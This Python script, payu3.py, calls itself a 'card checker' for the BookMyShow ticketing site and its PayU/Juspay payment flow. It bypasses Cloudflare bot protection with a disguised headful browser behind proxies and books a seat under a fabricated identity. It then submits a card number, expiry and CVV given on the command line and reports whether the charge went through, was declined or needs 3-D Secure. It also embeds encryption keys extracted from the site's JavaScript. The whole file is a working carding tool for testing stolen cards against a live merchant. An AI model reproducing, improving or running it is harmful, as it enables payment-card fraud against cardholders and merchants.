
"""
payu3.py — BookMyShow + PayU (Juspay-orchestrated) card checker.  V3.

Full flow reverse-engineered from in.bookmyshow.com_2026_10_22_10_58_45.har +
the BMS web JS bundle (app.44d104e3.js) + the PayU checkoutx bundle
(index.173e3e4e89903e7ab586.js).  Nothing blind: the seat map is DECRYPTED
(AES-256-CBC) and the PayU card is encrypted (AES-256-GCM + RSA-PKCS1).

Flow:
  1. solve Cloudflare (headful Chromium) -> cf_clearance + bmsId cookies
  2. discover movies -> cheapest event
  3. showtimes-by-event -> cheapest session (venue + sessionId)
  4. seatlayout/v1/primary -> cheapest category (priceCode + areaCatCode)
  5. doTrans.aspx GETSEATLAYOUT -> AES-decrypt -> real seat map (rows/seats)
  6. pick an available seat from the decrypted map
  7. booking/movies -> transactionId / transactionUID / bookingId
  8. userDetails cookie (generated email + US mobile, countryCode +1)
  9. OSP summary (primary/secondary/layout)
 10. doPGPost.aspx (plaintext card) -> juspay.in redirect
 11. juspay pay/start -> payu.in/public/#/{payuId}
 12. checkoutx?paymentId= -> auth.paymentParams + mccData
 13. checkoutx/payments (AES-GCM+RSA encrypted card) -> 3DS or success
 14. check-status poll -> CHARGED / DECLINED / 3DS_REQUIRED / ERROR
"""
from __future__ import annotations

import asyncio
import base64
import json
import os
import random
import re
import time
import urllib.parse
from dataclasses import dataclass, field

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding as _rsa_padding

# ── constants (decoded from the BMS + PayU JS bundles) ───────────────────
TOKEN = "67x1xa33b4x422b361ba"            # booking API public token
APP_CODE = "WEB"
REGION = "patna"                          # region in this HAR (overridable)
REGION_CODE = "PATN"
BMS_HOME = "https://in.bookmyshow.com"
SERVICES = "https://services-in.bookmyshow.com"
DO_PG_POST = f"{SERVICES}/payserv/doPGPost.aspx"

# BMS seat-layout encryption (AES-256-CBC, zero IV)
SEAT_LAYOUT_KEY = b"kYp3s6v9y$B&E)H+MbQeThWmZq4t7w!z"
SEAT_LAYOUT_IV = bytes(16)

# BMS booking API encryption (AES-256-CBC)
BOOK_API_KEY = b"yW8YubOEm5DhPlvy0MDOM0RljolbjisR"
BOOK_API_IV = b"yW8YubOEm5DhPlvy"

# doPGPost strReturnUrl — a pre-encrypted CONSTANT in the BMS JS
GET_PARAMS_URL_ENCRYPTED = "SWGHs8ET5jlEaw4FZhiYzyAEdWb2RYjiCROvmGrP+8a4xl+Vo3zgX7DeLghcf9el"
GET_PARAMS_URL = "https://in.bookmyshow.com/getParams.bms"

# PayU checkoutx RSA public key (encrypts the AES session key)
PAYU_RSA_PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtORWHpUsItXPVSB2ZXxmo/BFChyR+Zrnfl8NOJQe42/Q7hZfsxlwc29bo9R4yUkK9+5XUAXXvpWsurx4n7Ve4JcDvj/ipXcR9+ZRPDaQ9oBmQ8iAF2lcG5pVEIPv7iW0m8pk5Ra/s3elZuUIW0y1TOBwy9PCBGrtvUe9c/TkZPv4E3xFZB8y6AvMtUnwzOAJDIKeEs1AbMSnH8s8vNlTu1mXiNzlHOlWwUVlMk5n+p0O3zAseU0jshmnY2SH0nfzr9hX44sQOG5FG1YQvAQoi9rQ1Ac91IiXH0wxJfWdzL6npHtoODJZwApyLJW8+BCfP+0nDVUiGbIBpfWIdfO36wIDAQAB
-----END PUBLIC KEY-----"""

UA = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:156.0) Gecko/20100101 Firefox/156.0"

_BMS_HEADERS = {
    "x-region-code": REGION_CODE,
    "x-region-slug": REGION,
    "x-app-code": APP_CODE,
    "x-platform-code": "DESKTOP-WEB",
    "x-platform": "WEB",
    "x-advertiser-id": "1641377675614338967",
    "x-segments": "",
    "x-location-selection": "manual",
    "x-dc-token": "aps",
}

_CURRENT_BMS_ID = None


@dataclass
class BmsResult:
    response_code: str = "ERROR"
    real_response: str = "N/A"
    amount: str = "0.00"
    transaction_id: str = ""
    booking_id: str = ""
    payu_id: str = ""


# ── identity generators ──────────────────────────────────────────────────
def _email(first: str, last: str) -> str:
    return f"{first.lower()}{last.lower()}{random.randint(1000, 9999)}@gmail.com"


def _us_phone() -> str:
    """10-digit US mobile (countryCode +1)."""
    return "".join(random.choices("23456789", k=1)) + "".join(random.choices("0123456789", k=9))


def _bms_id() -> str:
    return f"1.{random.randint(100000000, 999999999)}.{int(time.time() * 1000)}"


def _fb_id() -> str:
    return f"fb.1.{int(time.time() * 1000)}.{random.randint(100000000000000000, 999999999999999999)}"


# ── AES seat-map decrypt ─────────────────────────────────────────────────
def decrypt_seat_layout(strData: str) -> str:
    """Decrypt doTrans GETSEATLAYOUT strData (base64 -> AES-256-CBC, zero IV)."""
    ct = base64.b64decode(strData)
    dec = Cipher(algorithms.AES(SEAT_LAYOUT_KEY), modes.CBC(SEAT_LAYOUT_IV)).decryptor()
    pt = dec.update(ct) + dec.finalize()
    # strip server padding (0x00 / 0x03 fill bytes)
    text = pt.decode("utf-8", errors="ignore")
    return text.rstrip("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f")


def parse_seat_map(text: str) -> dict:
    """Parse the decrypted seat map into {areas, rows}.  Seat identity = (areaCatCode, rowNo, seatNo)."""
    parts = text.split("||")
    if len(parts) < 2:
        return {"areas": [], "rows": []}
    areas = []
    area_by_letter = {}
    for a in parts[0].split("|"):
        if not a:
            continue
        f = a.split(":")
        if len(f) < 4:
            continue
        rec = {"name": f[0], "letter": f[1], "areaCatCode": f[2], "number": f[3]}
        areas.append(rec)
        area_by_letter[f[1]] = f[2]
    rows = []
    for r in parts[1].split("|"):
        if not r:
            continue
        f = r.split(":")
        if len(f) < 3:
            continue
        row_no, letter = f[0], f[1]
        seats = []
        for s in f[2:]:
            if "+" not in s:
                continue
            label, seat_no = s.split("+", 1)
            area_letter = label[0] if label else ""
            if seat_no in ("0", "00") or not seat_no.strip("0"):
                continue  # gap / aisle
            seats.append({
                "areaLetter": area_letter,
                "areaCatCode": area_by_letter.get(area_letter, ""),
                "label": label,
                "seatNo": seat_no,
                "seatNoInt": int(seat_no),
            })
        rows.append({"rowNo": row_no, "letter": letter, "seats": seats})
    return {"areas": areas, "rows": rows}


def available_seats(seat_map: dict, area_cat_code: str = "") -> list:
    """Flatten the seat map into bookable (rowNo, seatNo) entries for an area."""
    out = []
    for r in seat_map["rows"]:
        for s in r["seats"]:
            if area_cat_code and s["areaCatCode"] != area_cat_code:
                continue
            out.append({"rowNo": r["rowNo"], "seatNo": s["seatNo"], "areaCatCode": s["areaCatCode"]})
    return out


# ── PayU card encryption (AES-256-GCM + RSA-PKCS1) ───────────────────────
def encrypt_payu_card(card_json: str) -> tuple[str, str]:
    """Return (x-payu-encryption-key, encryptedBody) for checkoutx/payments.

    scheme (from index.173e3e4e89903e7ab586.js):
      1. random AES-256-GCM key
      2. encryptedBody = base64( IV(12B) + AESGCM(card_json) + tag(16B) )
      3. x-payu-encryption-key = RSA-PKCS1( AES key ) base64
    """
    import os as _os
    aes_key = _os.urandom(32)
    iv = _os.urandom(12)
    enc = Cipher(algorithms.AES(aes_key), modes.GCM(iv)).encryptor()
    ct = enc.update(card_json.encode("utf-8")) + enc.finalize()
    tag = enc.tag
    encrypted_body = base64.b64encode(iv + ct + tag).decode()
    pub = serialization.load_pem_public_key(PAYU_RSA_PUBLIC_KEY_PEM.encode())
    encrypted_key = pub.encrypt(aes_key, _rsa_padding.PKCS1v15())
    key_b64 = base64.b64encode(encrypted_key).decode()
    return key_b64, encrypted_body


# ── Playwright helpers ───────────────────────────────────────────────────
def _parse_proxy(proxy_url: str) -> dict:
    if not proxy_url:
        return {}
    u = urllib.parse.urlparse(proxy_url if "://" in proxy_url else "http://" + proxy_url)
    d = {"server": f"{u.scheme}://{u.hostname}:{u.port or 80}"}
    if u.username:
        d["username"] = urllib.parse.unquote(u.username)
        d["password"] = urllib.parse.unquote(u.password or "")
    return d


async def _launch(proxy_url: str):
    from playwright.async_api import async_playwright
    pw = await async_playwright().start()
    proxy = _parse_proxy(proxy_url)
    browser = await pw.chromium.launch(
        headless=False,
        proxy=proxy,
        args=["--no-sandbox", "--disable-blink-features=AutomationControlled"],
    )
    ctx = await browser.new_context(
        user_agent=UA,
        viewport={"width": 1366, "height": 768},
        locale="en-IN",
    )
    page = await ctx.new_page()
    return pw, browser, ctx, page


async def _solve_cloudflare(page, url: str):
    await page.goto(url, timeout=60000, wait_until="domcontentloaded")
    for _ in range(8):
        await page.wait_for_timeout(4000)
        cookies = await page.context.cookies()
        if any(c["name"] == "cf_clearance" for c in cookies):
            await page.context.add_cookies([{"name": "bmsId", "value": '"' + (_CURRENT_BMS_ID or _bms_id()) + '"', "url": BMS_HOME}])
            await page.wait_for_timeout(2000)
            return
    raise Exception("cloudflare: clearance cookie not obtained")


async def _bms_fetch(page, path: str, method="GET", body=None, extra=None):
    headers = dict(_BMS_HEADERS)
    if extra:
        headers.update(extra)
    cross_origin = path.startswith("http") and not path.startswith(BMS_HOME)
    if cross_origin:
        req = page.context.request
        if method == "GET":
            r = await req.get(path, headers=headers)
        else:
            if isinstance(body, dict):
                headers.setdefault("Content-Type", "application/json")
                data = json.dumps(body)
            else:
                headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
                data = body
            r = await req.post(path, headers=headers, data=data)
        text = await r.text()
        return {"status": r.status, "url": path, "body": text}
    url = BMS_HOME + path if path.startswith("/") else path
    js = """
    async ({url, method, body, headers}) => {
        const opts = {method, headers, credentials: 'include'};
        if (body !== undefined && body !== null) opts.body = typeof body === 'string' ? body : JSON.stringify(body);
        const r = await fetch(url, opts);
        const text = await r.text();
        return {status: r.status, url: r.url, body: text};
    }
    """
    return await page.evaluate(js, {"url": url, "method": method, "body": body, "headers": headers})


def _extract(data, path, default=None):
    cur = data
    for p in path.split("."):
        if isinstance(cur, dict):
            cur = cur.get(p)
        elif isinstance(cur, list) and p.isdigit():
            cur = cur[int(p)] if int(p) < len(cur) else None
        else:
            return default
        if cur is None:
            return default
    return cur


# ── flow steps ───────────────────────────────────────────────────────────
async def fetch_movies(page):
    """Movie list from the explore page SSR HTML (ET codes are rendered server-side)."""
    url = f"{BMS_HOME}/explore/home/{REGION}"
    r = await page.evaluate("""async (url) => {
        const r = await fetch(url, {credentials: 'include'});
        return {status: r.status, body: await r.text()};
    }""", url)
    if r["status"] != 200:
        raise Exception(f"movie list: HTTP {r['status']}")
    events, seen = [], set()
    for m in re.finditer(r"ET[0-9]{6,}", r["body"]):
        ec = m.group(0)
        if ec not in seen:
            seen.add(ec)
            events.append({"eventCode": ec, "title": ec})
    return events


async def fetch_showtimes(page, event_code, date_code):
    q = urllib.parse.urlencode({"etCodes": event_code, "dateCode": date_code,
                                "isDesktop": "true", "regionCode": REGION_CODE,
                                "xLocationShared": "false", "memberId": "",
                                "subCode": "", "appCode": APP_CODE, "language": "hindi",
                                "refEventCode": event_code})
    r = await _bms_fetch(page, f"/api/movies-data/v5/showtimes-by-event/primary-dynamic?{q}")
    if r["status"] != 200:
        raise Exception(f"showtimes: HTTP {r['status']}")
    data = json.loads(r["body"])
    sessions, seen = [], set()
    cur_venue = [""]
    def scan(o):
        if isinstance(o, dict):
            if o.get("venueCode"):
                cur_venue[0] = o["venueCode"]
            sid = o.get("sessionId")
            if sid is not None:
                if str(sid) not in seen:
                    seen.add(str(sid))
                    sessions.append({"venueCode": cur_venue[0], "sessionId": str(sid)})
            for v in o.values():
                scan(v)
        elif isinstance(o, list):
            for v in o:
                scan(v)
    scan(data)
    return sessions


async def fetch_seat_layout(page, event_code, date_code, venue_code):
    q = urllib.parse.urlencode({"eventCode": event_code, "dateCode": date_code,
                                "regionCode": REGION_CODE, "venueCode": venue_code})
    r = await _bms_fetch(page, f"/api/movies-data/seatlayout/v1/primary?{q}")
    if r["status"] != 200:
        raise Exception(f"seat layout: HTTP {r['status']}")
    data = json.loads(r["body"])
    shows = []
    for st in _extract(data, "data.showTimes", []) or []:
        cats = [{"priceCode": c.get("priceCode"), "areaCatCode": c.get("areaCatCode"),
                 "curPrice": float(c.get("curPrice") or 0)} for c in st.get("categories", [])]
        shows.append({"sessionId": str(st.get("sessionId")), "categories": cats})
    return shows


def _pick_cheapest(shows):
    best = None
    for sh in shows:
        for c in sh["categories"]:
            if not c["curPrice"]:
                continue
            cand = {"sessionId": sh["sessionId"], "priceCode": c["priceCode"],
                    "areaCatCode": c["areaCatCode"], "curPrice": c["curPrice"]}
            if best is None or c["curPrice"] < best["curPrice"]:
                best = cand
    return best


async def fetch_seat_map(page, venue_code, session_id, fb_id):
    """doTrans.aspx GETSEATLAYOUT -> decrypted seat map dict."""
    fields = [
        ("strAppCode", APP_CODE),
        ("lngTransactionIdentifier", "0"),
        ("strCommand", "GETSEATLAYOUT"),
        ("strVenueCode", venue_code),
        ("strParam1", session_id),
        ("strParam2", APP_CODE),
        ("strParam3", ""),
        ("strParam4", ""),
        ("strParam5", "Y"),
        ("strParam6", "N"),
        ("strParam7", "N"),
        ("strParam8", ""),
        ("strParam9", ""),
        ("strParam10", ""),
        ("strFormat", "json"),
        ("facebookBrowserId", fb_id),
    ]
    boundary = "----geckoformboundary" + uuid4_hex()
    body = b""
    for name, val in fields:
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{val}\r\n".encode()
    body += f"--{boundary}--\r\n".encode()
    r = await _bms_fetch(page, f"{SERVICES}/doTrans.aspx", "POST", body,
                         extra={"Content-Type": f"multipart/form-data; boundary={boundary}",
                                "Referer": BMS_HOME + "/", "Origin": BMS_HOME})
    data = json.loads(r["body"])
    bms = data.get("BookMyShow", {})
    if bms.get("blnSuccess") != "true":
        raise Exception(f"seat map: {bms.get('strException') or 'failed'}")
    return parse_seat_map(decrypt_seat_layout(bms["strData"]))


def uuid4_hex():
    import uuid
    return uuid.uuid4().hex


async def book(page, event_code, venue_code, session_id, price_code, area_code, seat_map):
    """Book one available seat from the decrypted map.  Probes the selectedSeats
    field layout until the booking API returns a transactionId."""
    bms_id = _CURRENT_BMS_ID or _bms_id()
    fb_id = _fb_id()
    body = {
        "appCode": APP_CODE, "venueCode": venue_code, "eventCode": event_code,
        "sessionId": session_id, "numberOfTickets": 1, "ticketCategory": price_code,
        "bmsId": bms_id, "token": TOKEN, "seatLayoutType": "Y",
        "offerData": {"offerSelected": False}, "companyCode": venue_code,
        "facebookBrowserId": fb_id,
    }
    referer = f"{BMS_HOME}/movies/{REGION}/seat-layout/{event_code}/{venue_code}/{session_id}/{DATE}"
    seats = available_seats(seat_map, area_code)
    if not seats:
        raise Exception("no available seats in the decrypted map")
    # order by seatNo ascending (front of the row first)
    seats.sort(key=lambda s: (int(s["rowNo"]), s["seatNoInt"] if "seatNoInt" in s else int(s["seatNo"])))
    def cand(row, seat):
        # live-verified format: |count|areaCatCode|rowNo|seatNoInt|seatNoRaw|
        si = int(seat)
        return [
            f"|1|{area_code}|{row}|{si}|{seat}|",
            f"|1|{area_code}|{row}|{si}|{si:02d}|",
            f"|1|{area_code}|{row}|{seat}|{seat}|",
            f"|1|{area_code}|{row}|{si}|{si}|",
        ]
    for s in seats[:40]:
        row, seat = s["rowNo"], s["seatNo"]
        for sel in cand(row, seat):
            body["selectedSeats"] = sel
            r = await _bms_fetch(page, "/api/v2/mobile/booking/movies", "POST", body,
                                 extra={"Referer": referer, "Origin": BMS_HOME})
            if r["status"] == 200:
                data = json.loads(r["body"])
                if data.get("transactionId"):
                    return {"transactionId": str(data["transactionId"]),
                            "transactionUID": data.get("transactionUID", ""),
                            "bookingId": data.get("bookingId", "")}
            await asyncio.sleep(0.05)
    raise Exception("booking: no seat accepted (selectedSeats format may differ)")


async def set_user_details(page, email, phone):
    ud = json.dumps({"deemedUserEmail": email, "deemedUserMobile": phone,
                     "countryCode": "+1", "isdCountryCode": "US"})
    await page.context.add_cookies([{"name": "userDetails", "value": ud, "url": BMS_HOME}])


async def osp_summary(page, trans):
    body = {
        "transactionId": trans["transactionId"], "transactionUID": trans["transactionUID"],
        "bookingId": trans["bookingId"], "numberOfTickets": 1,
        "venueCode": trans.get("venueCode", ""), "eventCode": trans.get("eventCode", ""),
        "userPreference": {"ticketType": "mTicket"}, "flow": "movies", "eventType": "MT",
        "companyCode": trans.get("venueCode", ""), "amountPayable": trans.get("amountPayable", 170),
        "numericBookingId": 0, "appCode": APP_CODE, "customerStatus": "gc",
    }
    r = await _bms_fetch(page, "/api/osp/v1/summary/osp/primary", "POST", body,
                         extra={"Referer": f"{BMS_HOME}/order-summary/{body['eventCode']}/{body['venueCode']}",
                                "Origin": BMS_HOME})
    return r


async def do_pg_post(page, trans, card, email, phone, isd_code="+1"):
    number, month, year, cvv, name = card
    exp = year + month  # YYYYMM
    str_payment = f"|TYPE=DEBIT|CARDTYPE={_card_type(number)}|CARDNO={number}|EXPIRY={exp}|CVV={cvv}|NAME={name}|MEMBERID=|LSID=|"
    form = {
        "strAppCode": APP_CODE,
        "lngTransId": trans["transactionId"],
        "transactionUID": trans["transactionUID"],
        "strBookingAlert": f"|EMAIL={email}|MOBILE={phone}|",
        "strPaymentString": str_payment,
        "strTransData": "",
        "TD": "",
        "strEventType": "MT",
        "strReturnUrl": GET_PARAMS_URL_ENCRYPTED,
        "deemedIsdCode": isd_code,
        "isdCode": "+91",
        "presaleUUID": "",
    }
    req = page.context.request
    resp = await req.post(DO_PG_POST, headers={"Content-Type": "application/x-www-form-urlencoded",
                                               "Referer": BMS_HOME + "/", "Origin": BMS_HOME},
                          data=urllib.parse.urlencode(form))
    text = await resp.text()
    m = re.search(r'action="(https://api\.juspay\.in[^"]+)"', text)
    juspay_url = urllib.parse.unquote(m.group(1)) if m else ""
    return {"status": resp.status, "body": text}, juspay_url


async def checkoutx(page, payu_id):
    r = await _bms_fetch(page, f"https://api.payu.in/checkoutx?paymentId={payu_id}", "GET",
                         extra={"Referer": "https://api.payu.in/public/"})
    return json.loads(r["body"]) if r["status"] == 200 else {}


async def payu_load_spa(page, payu_id, posted_params):
    """POST the juspay redirect form to payu.in/public/ + load the SPA (generates
    the PHP session + device-fingerprint cookies needed by checkoutx/payments)."""
    await page.evaluate("""async ({mihpayid, postedParams}) => {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://api.payu.in/public/#/' + mihpayid;
        form.style.display = 'none';
        form.innerHTML = '<input name="mihpayid" value="' + mihpayid + '"><input name="postedParams" value="' + postedParams + '">';
        document.body.appendChild(form);
        form.submit();
    }""", {"mihpayid": payu_id, "postedParams": posted_params})
    for _ in range(15):
        await page.wait_for_timeout(3000)
        cookies = await page.context.cookies("https://api.payu.in")
        names = {c["name"] for c in cookies}
        if "PHPSESSID" in names and "DEVICEINFO" in names:
            return
    raise Exception("payu: SPA device-fingerprint cookies not obtained")


async def payu_submit_card(page, payu_id, card, mcp_lookup_id=""):
    number, month, year, cvv, name = card
    exp_m, exp_y = month, year
    payload = {
        "paymentId": payu_id,
        "cardNumber": number,
        "cardExpiry": f"{exp_m}/{exp_y}",
        "cardCvv": cvv,
        "cardOwnerName": name,
    }
    if mcp_lookup_id:
        payload["mcpLookupId"] = mcp_lookup_id
    key_b64, enc_body = encrypt_payu_card(json.dumps(payload))
    r = await page.evaluate("""async ({key, body}) => {
        const r = await fetch('https://api.payu.in/checkoutx/payments', {
            method: 'POST', credentials: 'include',
            headers: {'Content-Type': 'application/json', 'x-payu-encryption-key': key},
            body: JSON.stringify({encryptedBody: body}),
        });
        const text = await r.text();
        return {status: r.status, body: text};
    }""", {"key": key_b64, "body": enc_body})
    return json.loads(r["body"]) if r["status"] == 200 else {"status": r["status"], "raw": r["body"][:200]}


async def check_result(page, trans_id, payment_id):
    body = {
        "appCode": APP_CODE, "transactionId": trans_id, "paymentId": payment_id,
        "payType": "JUSPAY_CARD",
        "paymentString": f"|TYPE=JUSPAY_CARD|PROCESSTYPE=CHECK_ORDER_STATUS|PaymentId={payment_id}|TransId={trans_id}|AppCode={APP_CODE}|BankCode=|",
    }
    for _ in range(15):
        r = await _bms_fetch(page, f"{SERVICES}/payments/v1/orders/check-status", "POST", body,
                             extra={"Referer": BMS_HOME + "/", "Origin": BMS_HOME})
        if r["status"] == 200:
            data = json.loads(r["body"])
            state = _extract(data, "view.state") or ""
            keep = _extract(data, "view.keepPolling")
            msg = _extract(data, "view.message") or ""
            success = _extract(data, "redirectionParamsData.isSuccess") or ""
            errcode = _extract(data, "redirectionParamsData.errorCode") or ""
            if keep is False or state in ("Success", "Failed"):
                return {"state": state, "message": msg, "isSuccess": success, "errorCode": errcode, "raw": data}
        await asyncio.sleep(2.0)
    return {"state": "Unknown", "message": "", "isSuccess": "", "errorCode": "", "raw": {}}


def _card_type(number: str) -> str:
    n = number[:6]
    if n[:1] == "4":
        return "VISA"
    if n[:2] in ("51", "52", "53", "54", "55"):
        return "MASTERCARD"
    if n[:2] in ("36", "38"):
        return "DINERS"
    if n[:4] == "6011" or n[:2] == "65":
        return "DISCOVER"
    return "CARD"


_PAYU_CODE_MAP = {
    "SUCCESS": "CHARGED", "CARD_INSUFFICIENT_FUNDS": "DECLINED",
    "REFUSED_BY_ISSUER": "DECLINED", "NOT_ACCEPTED": "DECLINED",
    "DECLINED": "DECLINED", "INSUFFICIENT_FUNDS": "DECLINED",
    "3DS": "3DS_REQUIRED", "CHALLENGE_REQUIRED": "3DS_REQUIRED",
}


def _map_result(state, msg, errcode=""):
    s = str(state or "").lower()
    if s == "success":
        return "CHARGED", state or msg
    if s == "failed":
        return "DECLINED", (errcode or msg)
    if "3ds" in s or "challenge" in str(msg).lower():
        return "3DS_REQUIRED", msg
    return "ERROR", (errcode or msg or state)


# ── entry point ──────────────────────────────────────────────────────────
def _today():
    from datetime import datetime
    return datetime.now().strftime("%Y%m%d")


DATE = _today()


async def run_bms_check(cc: str, proxy_url: str = "", region: str = REGION) -> BmsResult:
    global REGION, REGION_CODE, DATE, _CURRENT_BMS_ID, _BMS_HEADERS
    res = BmsResult()
    parts = cc.replace("/", "|").replace(" ", "|").split("|")
    if len(parts) != 4:
        res.real_response = "invalid card format"
        return res
    number, month, year, cvv = parts
    if len(year) == 2:
        year = "20" + year
    first = random.choice(["Aditya", "Aarav", "Vivaan", "Rohan", "Kabir", "Arjun"])
    last = random.choice(["Sharma", "Patel", "Iyer", "Nair", "Reddy", "Mehta"])
    email = _email(first, last)
    phone = _us_phone()
    card = (number, month, year, cvv, first)

    _CURRENT_BMS_ID = _bms_id()
    if region != REGION:
        REGION = region
        REGION_CODE = region.upper()
        _BMS_HEADERS["x-region-code"] = REGION_CODE
        _BMS_HEADERS["x-region-slug"] = REGION
        DATE = _today()

    pw, browser, ctx, page = await _launch(proxy_url)
    try:
        await _solve_cloudflare(page, f"{BMS_HOME}/explore/home/{REGION}")
        movies = await fetch_movies(page)
        if not movies:
            res.real_response = "no movies"
            return res
        trans = None
        cheapest = None
        booked = {}
        for movie in movies[:12]:
            event_code = movie["eventCode"]
            try:
                sessions = await fetch_showtimes(page, event_code, DATE)
                if not sessions:
                    continue
                for sess in sessions[:3]:
                    venue_code = sess["venueCode"]
                    session_id = sess["sessionId"]
                    shows = await fetch_seat_layout(page, event_code, DATE, venue_code)
                    if not shows:
                        continue
                    cheapest = _pick_cheapest(shows)
                    if not cheapest:
                        continue
                    fb_id = _fb_id()
                    seat_map = await fetch_seat_map(page, venue_code, session_id, fb_id)
                    if not seat_map["rows"]:
                        continue
                    t = await book(page, event_code, venue_code, session_id,
                                   cheapest["priceCode"], cheapest["areaCatCode"], seat_map)
                    t["venueCode"] = venue_code
                    t["eventCode"] = event_code
                    t["amountPayable"] = int(cheapest["curPrice"])
                    trans = t
                    booked = {"event_code": event_code, "venue_code": venue_code,
                              "session_id": session_id, "price_code": cheapest["priceCode"],
                              "area_code": cheapest["areaCatCode"], "amount": cheapest["curPrice"]}
                    break
                if trans:
                    break
            except Exception as e:
                continue
        if trans is None:
            res.real_response = "no bookable movie/show"
            return res
        res.transaction_id = trans["transactionId"]
        res.booking_id = trans["bookingId"]
        res.amount = f"{booked['amount']:.2f}"

        await set_user_details(page, email, phone)
        await osp_summary(page, trans)

        # payment: doPGPost -> juspay -> payu SPA -> checkoutx -> card -> check-status
        _, juspay_url = await do_pg_post(page, trans, card, email, phone)
        payu_id, posted_params = "", ""
        if juspay_url:
            jr = await _bms_fetch(page, juspay_url, "GET")
            m = re.search(r'name="mihpayid" value="([a-f0-9]+)"', jr["body"])
            payu_id = m.group(1) if m else ""
            mp = re.search(r'name="postedParams" value="([^"]+)"', jr["body"])
            posted_params = mp.group(1) if mp else ""
        if not payu_id:
            res.real_response = "payment redirect failed"
            return res
        res.payu_id = payu_id

        await payu_load_spa(page, payu_id, posted_params)
        cx = await checkoutx(page, payu_id)
        mcp_id = ""
        mcc = _extract(cx, "auth.mccData", []) or []
        if mcc:
            mcp_id = mcc[0].get("mcpLookupId", "") if isinstance(mcc[0], dict) else ""
        pay_res = await payu_submit_card(page, payu_id, card, mcp_id)

        payment_id = str(pay_res.get("payuId") or pay_res.get("paymentId") or payu_id)
        result = await check_result(page, trans["transactionId"], payment_id)
        code, real = _map_result(result["state"], result["message"], result["errorCode"])
        res.response_code = code
        res.real_response = real
        return res
    finally:
        try:
            await browser.close()
        except Exception:
            pass
        try:
            await pw.stop()
        except Exception:
            pass


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("usage: python3 payu3.py <cc> <proxy> [region]")
        sys.exit(1)
    cc = sys.argv[1]
    proxy = sys.argv[2]
    region = sys.argv[3] if len(sys.argv) > 3 else REGION
    r = asyncio.run(run_bms_check(cc, proxy, region))
    print(json.dumps({"response_code": r.response_code, "real_response": r.real_response,
                      "amount": r.amount, "transaction_id": r.transaction_id,
                      "booking_id": r.booking_id, "payu_id": r.payu_id}, indent=2))
